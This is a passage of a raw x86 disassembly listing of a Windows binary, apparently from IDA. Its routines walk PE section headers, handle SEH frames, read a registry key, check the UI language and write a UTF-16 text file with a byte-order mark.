                xor     edx, edx
                push    edi
                lea     eax, [eax+ecx+18h]
                test    esi, esi
                jz      short loc_168F5
                mov     edi, [ebp+arg_4]

loc_168DD:                              ; CODE XREF: sub_168B8+3B↓j
                mov     ecx, [eax+0Ch]
                cmp     edi, ecx
                jb      short loc_168ED
                mov     ebx, [eax+8]
                add     ebx, ecx
                cmp     edi, ebx
                jb      short loc_168F7

loc_168ED:                              ; CODE XREF: sub_168B8+2A↑j
                inc     edx
                add     eax, 28h ; '('
                cmp     edx, esi
                jb      short loc_168DD

loc_168F5:                              ; CODE XREF: sub_168B8+20↑j
                xor     eax, eax

loc_168F7:                              ; CODE XREF: sub_168B8+33↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_168B8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16908       proc near               ; CODE XREF: CODE:000160B7↑p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AA50h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 8
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     [ebp+var_4], 0
                push    1000000h
                call    sub_16878
                add     esp, 4
                test    eax, eax
                jz      short loc_169A9
                mov     eax, [ebp+arg_0]
                sub     eax, 1000000h
                push    eax
                push    1000000h
                call    sub_168B8
                add     esp, 8
                test    eax, eax
                jz      short loc_169A9
                mov     eax, [eax+24h]
                shr     eax, 1Fh
                not     eax
                and     eax, 1
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                xor     edx, edx
                cmp     dword ptr [ecx], 0C0000005h
                setz    dl
                mov     eax, edx
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]

loc_169A9:                              ; CODE XREF: sub_16908+4B↑j
                                        ; sub_16908+65↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                xor     eax, eax
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_16908       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_169CA       proc near               ; CODE XREF: CODE:0001608C↑p
                jmp     dword ptr ds:10011DCh
sub_169CA       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_169D6       proc near               ; CODE XREF: CODE:00016057↑p
                jmp     dword ptr ds:10011E0h
sub_169D6       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_169E8       proc near               ; CODE XREF: CODE:00015FC7↑p
                                        ; sub_1626F+7↑p ...

arg_4           = dword ptr  8

                push    1005AB7h
                push    large dword ptr fs:0
                mov     eax, [esp+8+arg_4]
                mov     [esp+8+arg_4], ebp
                lea     ebp, [esp+8+arg_4]
                sub     esp, eax
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp-4], eax
                xor     eax, ebp
                push    eax
                mov     [ebp-18h], esp
                push    dword ptr [ebp-8]
                mov     eax, [ebp-4]
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                mov     [ebp-8], eax
                lea     eax, [ebp-10h]
                mov     large fs:0, eax
                retn
sub_169E8       endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_16A2D       proc near               ; CODE XREF: CODE:loc_1618B↑p
                                        ; sub_1626F+45↑p ...
                mov     ecx, [ebp-10h]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                push    ecx
                retn
sub_16A2D       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16A46       proc near               ; CODE XREF: CODE:loc_16236↑p
                mov     edi, edi
                push    esi
                push    30000h
                push    offset byte_10000
                xor     esi, esi
                push    esi
                call    sub_16B78
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_16A6C
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_16B6C

loc_16A6C:                              ; CODE XREF: sub_16A46+1A↑j
                pop     esi
                retn
sub_16A46       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16A7B       proc near               ; CODE XREF: CODE:0001621C↑p
                xor     eax, eax
                retn
sub_16A7B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16A83       proc near               ; CODE XREF: CODE:00016255↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     eax, ds:100C088h
                and     [ebp+var_8], 0
                and     [ebp+var_4], 0
                push    ebx
                push    edi
                mov     edi, 0BB40E64Eh
                mov     ebx, 0FFFF0000h
                cmp     eax, edi
                jz      short loc_16AB5
                test    ebx, eax
                jz      short loc_16AB5
                not     eax
                mov     ds:100C08Ch, eax
                jmp     short loc_16B1A
; ---------------------------------------------------------------------------

loc_16AB5:                              ; CODE XREF: sub_16A83+23↑j
                                        ; sub_16A83+27↑j
                push    esi
                lea     eax, [ebp+var_8]
                push    eax
                call    dword ptr ds:1001114h
                mov     esi, [ebp+var_4]
                xor     esi, [ebp+var_8]
                call    dword ptr ds:1001074h
                xor     esi, eax
                call    dword ptr ds:1001148h
                xor     esi, eax
                call    dword ptr ds:1001118h
                xor     esi, eax
                lea     eax, [ebp+var_10]
                push    eax
                call    dword ptr ds:100111Ch
                mov     eax, [ebp+var_C]
                xor     eax, [ebp+var_10]
                xor     esi, eax
                cmp     esi, edi
                jnz     short loc_16AFB
                mov     esi, 0BB40E64Fh
                jmp     short loc_16B0B
; ---------------------------------------------------------------------------

loc_16AFB:                              ; CODE XREF: sub_16A83+6F↑j
                test    ebx, esi
                jnz     short loc_16B0B
                mov     eax, esi
                or      eax, 4711h
                shl     eax, 10h
                or      esi, eax

loc_16B0B:                              ; CODE XREF: sub_16A83+76↑j
                                        ; sub_16A83+7A↑j
                mov     ds:100C088h, esi
                not     esi
                mov     ds:100C08Ch, esi
                pop     esi

loc_16B1A:                              ; CODE XREF: sub_16A83+30↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_16A83       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B24       proc near               ; CODE XREF: sub_162D9:loc_16320↑p
                                        ; sub_167AD:loc_167E4↑p
                jmp     dword ptr ds:100120Ch
sub_16B24       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B30       proc near               ; CODE XREF: sub_16453+2↑p
                jmp     dword ptr ds:1001210h
sub_16B30       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B3C       proc near               ; CODE XREF: sub_163BB+64↑p
                jmp     dword ptr ds:1001214h
sub_16B3C       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B48       proc near               ; CODE XREF: sub_163BB+30↑p
                jmp     dword ptr ds:1001218h
sub_16B48       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B54       proc near               ; CODE XREF: sub_1647D+C8↑p
                                        ; sub_1647D+EC↑p
                jmp     dword ptr ds:1001220h
sub_16B54       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B60       proc near               ; CODE XREF: sub_1670F+1B↑p
                jmp     dword ptr ds:1001224h
sub_16B60       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B6C       proc near               ; CODE XREF: sub_16A46+21↑p
                jmp     dword ptr ds:1001228h
sub_16B6C       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B78       proc near               ; CODE XREF: sub_16A46+10↑p
                jmp     dword ptr ds:100122Ch
sub_16B78       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_16B84       proc near               ; CODE XREF: sub_16751:loc_16784↑p
                jmp     dword ptr ds:1001230h
sub_16B84       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_16B8F:                              ; CODE XREF: CODE:00016C35↓j
                mov     edi, edi
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                jz      short loc_16BA4
                push    dword ptr [esi]
                call    sub_16588
                and     dword ptr [esi], 0
                pop     ecx

loc_16BA4:                              ; CODE XREF: CODE:00016B97↑j
                and     dword ptr [esi+4], 0
                and     dword ptr [esi+8], 0
                pop     esi
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16BB3       proc near               ; CODE XREF: sub_16BDD+5↓p
                mov     edi, edi
                push    esi
                push    edi
                mov     esi, ecx
                push    18h
                xor     edi, edi
                lea     eax, [esi+14h]
                push    edi
                push    eax
                call    sub_16746
                add     esp, 0Ch
                mov     [esi+2Ch], edi
                mov     [esi+30h], edi
                mov     [esi+34h], edi
                pop     edi
                mov     eax, esi
                pop     esi
                retn
sub_16BB3       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16BDD       proc near               ; CODE XREF: CODE:0001B2F9↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                call    sub_16BB3
                mov     eax, 1000000h
                lea     ecx, [esi+14h]
                mov     dword ptr [esi], 38h ; '8'
                mov     [esi+8], eax
                mov     [esi+4], eax
                mov     dword ptr [esi+0Ch], 0A00h
                mov     dword ptr [esi+10h], 10017E0h
                call    sub_13998
                test    eax, eax
                jns     short loc_16C19
                mov     byte ptr ds:100C0E8h, 1

loc_16C19:                              ; CODE XREF: sub_16BDD+33↑j
                mov     eax, esi
                pop     esi
                retn
sub_16BDD       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
                align 4
                push    esi
                mov     esi, ecx
                lea     eax, [esi+14h]
                push    eax
                call    dword ptr ds:1001044h
                lea     ecx, [esi+2Ch]
                pop     esi
                jmp     loc_16B8F
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16C3F       proc near               ; CODE XREF: sub_16C5D+5↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                push    18h
                lea     eax, [esi+10h]
                push    0
                push    eax
                call    sub_16746
                add     esp, 0Ch
                mov     eax, esi
                pop     esi
                retn
sub_16C3F       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_16C5D       proc near               ; CODE XREF: CODE:0001B314↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                call    sub_16C3F
                and     dword ptr [esi], 0
                lea     ecx, [esi+10h]
                mov     dword ptr [esi+4], 1000000h
                mov     dword ptr [esi+8], 100AD54h
                mov     dword ptr [esi+0Ch], 100AD58h
                call    sub_13998
                test    eax, eax
                jns     short loc_16C94
                mov     byte ptr ds:100C0E8h, 1
                jmp     short loc_16C9A
; ---------------------------------------------------------------------------

loc_16C94:                              ; CODE XREF: sub_16C5D+2C↑j
                mov     dword ptr [esi], 28h ; '('

loc_16C9A:                              ; CODE XREF: sub_16C5D+35↑j
                mov     eax, esi
                pop     esi
                retn
sub_16C5D       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16CA3       proc near               ; CODE XREF: sub_16D08+28↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    dword ptr ds:100110Ch
                test    eax, eax
                jnz     short loc_16CBA
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_16CBA:                              ; CODE XREF: sub_16CA3+13↑j
                push    esi
                push    eax
                call    dword ptr ds:1001110h
                mov     esi, eax
                test    esi, esi
                jz      short loc_16CF3
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    dword ptr ds:1001108h
                mov     edx, [ebp+arg_8]
                lea     ecx, [esi+eax]
                and     edx, 0Fh
                jbe     short loc_16CEF

loc_16CDF:                              ; CODE XREF: sub_16CA3+4A↓j
                cmp     esi, ecx
                jnb     short loc_16CF3
                movzx   eax, word ptr [esi]
                lea     esi, [esi+eax*2]
                add     esi, 2
                dec     edx
                jnz     short loc_16CDF

loc_16CEF:                              ; CODE XREF: sub_16CA3+3A↑j
                cmp     esi, ecx
                jb      short loc_16CF7

loc_16CF3:                              ; CODE XREF: sub_16CA3+23↑j
                                        ; sub_16CA3+3E↑j
                xor     eax, eax
                jmp     short loc_16D00
; ---------------------------------------------------------------------------

loc_16CF7:                              ; CODE XREF: sub_16CA3+4E↑j
                movzx   eax, word ptr [esi]
                neg     eax
                sbb     eax, eax
                and     eax, esi

loc_16D00:                              ; CODE XREF: sub_16CA3+52↑j
                pop     esi
                pop     ebp
                retn
sub_16CA3       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16D08       proc near               ; CODE XREF: sub_16D6B+B↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                shr     eax, 4
                inc     eax
                movzx   eax, ax
                push    6
                push    eax
                push    [ebp+arg_0]
                call    dword ptr ds:1001104h
                test    eax, eax
                jnz     short loc_16D29
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_16D29:                              ; CODE XREF: sub_16D08+1D↑j
                push    [ebp+arg_4]
                push    eax
                push    [ebp+arg_0]
                call    sub_16CA3
                add     esp, 0Ch
                pop     ebp
                retn
sub_16D08       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16D3F       proc near               ; CODE XREF: sub_16DE6+39↓p
                                        ; sub_16DE6+4D↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                push    dword ptr [esi]
                call    dword ptr ds:1001244h
                and     dword ptr [esi], 0
                push    esi
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_16D6B
                add     esp, 0Ch
                pop     esi
                pop     ebp
                retn    8
sub_16D3F       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16D6B       proc near               ; CODE XREF: sub_16D3F+1A↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_16D08
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_16D96
                movzx   ecx, word ptr [eax]
                push    ecx
                add     eax, 2
                push    eax
                call    dword ptr ds:1001240h
                mov     ecx, [ebp+arg_8]
                mov     [ecx], eax
                jmp     short loc_16D9C
; ---------------------------------------------------------------------------

loc_16D96:                              ; CODE XREF: sub_16D6B+14↑j
                mov     ecx, [ebp+arg_8]
                and     dword ptr [ecx], 0

loc_16D9C:                              ; CODE XREF: sub_16D6B+29↑j
                cmp     dword ptr [ecx], 0
                setnz   al
                pop     ebp
                retn
sub_16D6B       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16DA9       proc near               ; CODE XREF: sub_1386A+2F↑p
                                        ; sub_1386A+44↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                lea     eax, [ebp+var_4]
                push    eax
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_16DE6
                mov     esi, [ebp+arg_8]
                mov     edi, [ebp+var_4]
                add     esp, 0Ch
                mov     ebx, eax
                cmp     [esi], edi
                jz      short loc_16DDA
                push    dword ptr [esi]
                call    dword ptr ds:1001244h
                mov     [esi], edi

loc_16DDA:                              ; CODE XREF: sub_16DA9+25↑j
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                leave
                retn
sub_16DA9       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16DE6       proc near               ; CODE XREF: sub_14A83+6F↑p
                                        ; sub_16DA9+13↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                cmp     byte ptr ds:100C730h, 0
                jnz     short loc_16E0C
                push    [ebp+arg_0]
                call    sub_16E67
                pop     ecx
                mov     ds:100C72Ch, eax
                mov     byte ptr ds:100C730h, 1
                jmp     short loc_16E11
; ---------------------------------------------------------------------------

loc_16E0C:                              ; CODE XREF: sub_16DE6+D↑j
                mov     eax, ds:100C72Ch

loc_16E11:                              ; CODE XREF: sub_16DE6+24↑j
                push    ebx
                push    esi
                push    [ebp+arg_4]
                xor     esi, esi
                push    eax
                lea     ecx, [ebp+var_4]
                mov     [ebp+var_4], esi
                call    sub_16D3F
                mov     bl, al
                test    bl, bl
                jnz     short loc_16E48
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_4]
                push    [ebp+arg_0]
                call    sub_16D3F
                mov     bl, al
                test    bl, bl
                jnz     short loc_16E48
                mov     eax, [ebp+arg_8]
                mov     [eax], esi
                mov     esi, [ebp+var_4]
                jmp     short loc_16E50
; ---------------------------------------------------------------------------

loc_16E48:                              ; CODE XREF: sub_16DE6+42↑j
                                        ; sub_16DE6+56↑j
                mov     ecx, [ebp+var_4]
                mov     eax, [ebp+arg_8]
                mov     [eax], ecx

loc_16E50:                              ; CODE XREF: sub_16DE6+60↑j
                push    esi
                call    dword ptr ds:1001244h
                xor     eax, eax
                test    bl, bl
                pop     esi
                setnz   al
                pop     ebx
                leave
                retn
sub_16DE6       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16E67       proc near               ; CODE XREF: sub_16DE6+12↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    dword ptr ds:1001100h
                mov     ecx, 409h
                cmp     ax, cx
                jz      short loc_16E88
                push    [ebp+arg_0]
                call    sub_175D4
                test    eax, eax
                jnz     short loc_16E8B

loc_16E88:                              ; CODE XREF: sub_16E67+13↑j
                mov     eax, [ebp+arg_0]

loc_16E8B:                              ; CODE XREF: sub_16E67+1F↑j
                pop     ebp
                retn
sub_16E67       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16E92       proc near               ; CODE XREF: sub_16F0A+60↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                mov     esi, [ebp+arg_4]
                push    edi
                mov     edi, [ebp+arg_8]
                mov     eax, [edi]
                add     eax, eax
                mov     [ebp+var_4], eax
                lea     eax, [ebp+var_4]
                push    eax
                push    esi
                lea     eax, [ebp+arg_8]
                push    eax
                xor     ebx, ebx
                push    ebx
                push    [ebp+arg_0]
                mov     [edi], ebx
                push    dword ptr [ecx]
                call    dword ptr ds:1001004h
                test    eax, eax
                jnz     short loc_16EFE
                cmp     [ebp+arg_8], 1
                jz      short loc_16ED6
                cmp     [ebp+arg_8], 2
                jz      short loc_16ED6

loc_16ED1:                              ; CODE XREF: sub_16E92+52↓j
                                        ; sub_16E92+5F↓j
                push    0Dh
                pop     eax
                jmp     short loc_16EFE
; ---------------------------------------------------------------------------

loc_16ED6:                              ; CODE XREF: sub_16E92+37↑j
                                        ; sub_16E92+3D↑j
                mov     ecx, [ebp+var_4]
                test    esi, esi
                jz      short loc_16EF8
                test    ecx, ecx
                jz      short loc_16EF3
                test    cl, 1
                jnz     short loc_16ED1
                mov     eax, ecx
                shr     eax, 1
                cmp     [esi+eax*2-2], bx
                jz      short loc_16EF8
                jmp     short loc_16ED1
; ---------------------------------------------------------------------------

loc_16EF3:                              ; CODE XREF: sub_16E92+4D↑j
                xor     eax, eax
                mov     [esi], ax

loc_16EF8:                              ; CODE XREF: sub_16E92+49↑j
                                        ; sub_16E92+5D↑j
                shr     ecx, 1
                mov     [edi], ecx
                xor     eax, eax

loc_16EFE:                              ; CODE XREF: sub_16E92+31↑j
                                        ; sub_16E92+42↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn    0Ch
sub_16E92       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16F0A       proc near               ; CODE XREF: sub_14A83+130↑p
                                        ; sub_16F9F+2B↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    20019h
                xor     eax, eax
                push    1001840h
                push    80000002h
                lea     ecx, [ebp+var_10]
                mov     [ebp+var_10], eax
                mov     [ebp+var_C], eax
                mov     [ebp+var_8], eax
                call    sub_14103
                test    eax, eax
                jz      short loc_16F52
                push    1001898h
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_14A14
                lea     ecx, [ebp+var_10]
                call    sub_1415F
                leave
                retn
; ---------------------------------------------------------------------------

loc_16F52:                              ; CODE XREF: sub_16F0A+2C↑j
                push    esi
                mov     esi, [ebp+arg_4]
                push    edi
                mov     edi, [ebp+arg_0]
                lea     eax, [ebp+var_4]
                push    eax
                push    edi
                push    100189Ch
                lea     ecx, [ebp+var_10]
                mov     [ebp+var_4], esi
                call    sub_16E92
                test    eax, eax
                jnz     short loc_16F7A
                mov     eax, [ebp+var_4]
                cmp     eax, esi
                jb      short loc_16F88

loc_16F7A:                              ; CODE XREF: sub_16F0A+67↑j
                push    1001898h
                push    esi
                push    edi
                call    sub_14A14
                jmp     short loc_16F8E
; ---------------------------------------------------------------------------

loc_16F88:                              ; CODE XREF: sub_16F0A+6E↑j
                xor     ecx, ecx
                mov     [edi+eax*2], cx

loc_16F8E:                              ; CODE XREF: sub_16F0A+7C↑j
                lea     ecx, [ebp+var_10]
                call    sub_1415F
                pop     edi
                pop     esi
                leave
                retn
sub_16F0A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_16F9F       proc near               ; CODE XREF: sub_14A83+1C6↑p

var_20C         = byte ptr -20Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 20Ch
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, 104h
                push    esi
                mov     esi, [ebp+arg_0]
                cmp     [ebp+arg_4], eax
                jb      short loc_16FEA
                push    eax
                lea     eax, [ebp+var_20C]
                push    eax
                call    sub_16F0A
                pop     ecx
                pop     ecx
                push    esi
                push    0
                push    10018C0h
                lea     eax, [ebp+var_20C]
                push    eax
                call    dword ptr ds:10010F0h
                test    eax, eax
                jnz     short loc_16FF8

loc_16FEA:                              ; CODE XREF: sub_16F9F+21↑j
                push    100182Ch
                push    [ebp+arg_4]
                push    esi
                call    sub_14A14

loc_16FF8:                              ; CODE XREF: sub_16F9F+49↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                pop     esi
                call    sub_165AB
                leave
                retn
sub_16F9F       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1700A       proc near               ; CODE XREF: sub_14A83+20C↑p

var_2188        = dword ptr -2188h
var_1188        = word ptr -1188h
var_1174        = dword ptr -1174h
var_1164        = byte ptr -1164h
var_1160        = dword ptr -1160h
var_115C        = dword ptr -115Ch
var_1158        = dword ptr -1158h
var_1154        = dword ptr -1154h
var_1150        = word ptr -1150h
var_114C        = byte ptr -114Ch
var_1148        = dword ptr -1148h
var_1144        = dword ptr -1144h
var_1140        = dword ptr -1140h
var_113C        = dword ptr -113Ch
var_1134        = byte ptr -1134h
var_102C        = byte ptr -102Ch
var_1028        = dword ptr -1028h
var_1024        = dword ptr -1024h
var_1020        = dword ptr -1020h
var_101C        = dword ptr -101Ch
var_1018        = dword ptr -1018h
var_100C        = byte ptr -100Ch
var_C0C         = byte ptr -0C0Ch
var_A04         = word ptr -0A04h
var_A02         = byte ptr -0A02h
var_204         = word ptr -204h
var_202         = byte ptr -202h
var_104         = word ptr -104h
var_102         = byte ptr -102h
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, 2188h
                call    __alloca_probe
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                mov     ebx, ds:10010F8h
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                xor     esi, esi
                push    esi
                lea     eax, [ebp+var_114C]
                push    eax
                push    2
                lea     eax, [ebp+var_1150]
                push    eax
                push    edi
                mov     [ebp+var_1150], 0FEFFh
                mov     [ebp+var_1158], esi
                call    ebx
                xor     eax, eax
                push    7FEh
                mov     [ebp+var_A04], ax
                lea     eax, [ebp+var_A02]
                push    esi
                push    eax
                call    sub_16746
                xor     eax, eax
                mov     esi, 0FEh
                push    esi
                push    eax
                mov     [ebp+var_104], ax
                lea     eax, [ebp+var_102]
                push    eax
                call    sub_16746
                xor     eax, eax
                push    esi
                mov     [ebp+var_204], ax
                xor     esi, esi
                lea     eax, [ebp+var_202]
                push    esi
                push    eax
                call    sub_16746
                add     esp, 24h
                push    80h
                lea     eax, [ebp+var_104]
                push    eax
                push    10018C8h
                push    esi
                push    esi
                push    400h
                call    dword ptr ds:10010E0h
                test    eax, eax
                jz      short loc_17140
                push    80h
                lea     eax, [ebp+var_204]
                push    eax
                push    10018E0h
                push    esi
                push    esi
                push    400h
                call    dword ptr ds:10010E4h
                test    eax, eax
                jz      short loc_17140
                lea     eax, [ebp+var_204]
                push    eax
                lea     eax, [ebp+var_104]
                push    eax
                push    10018F8h
                lea     eax, [ebp+var_A04]
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 14h
                lea     edx, [ecx+2]

loc_1711B:                              ; CODE XREF: sub_1700A+11A↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, si
                jnz     short loc_1711B
                push    esi
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx

loc_17140:                              ; CODE XREF: sub_1700A+BD↑j
                                        ; sub_1700A+DF↑j
                call    dword ptr ds:1001074h
                push    eax
                push    1001944h
                lea     eax, [ebp+var_A04]
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 10h
                lea     edx, [ecx+2]

loc_17169:                              ; CODE XREF: sub_1700A+168↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, si
                jnz     short loc_17169
                push    esi
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx
                push    80h
                lea     eax, [ebp+var_104]
                push    eax
                push    esi
                call    dword ptr ds:1001060h
                test    eax, eax
                jz      short loc_171F3
                lea     eax, [ebp+var_104]
                push    eax
                push    100195Ch
                lea     eax, [ebp+var_A04]
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 10h
                lea     edx, [ecx+2]

loc_171CE:                              ; CODE XREF: sub_1700A+1CD↓j
                mov     ax, [ecx]
                add     ecx, 2
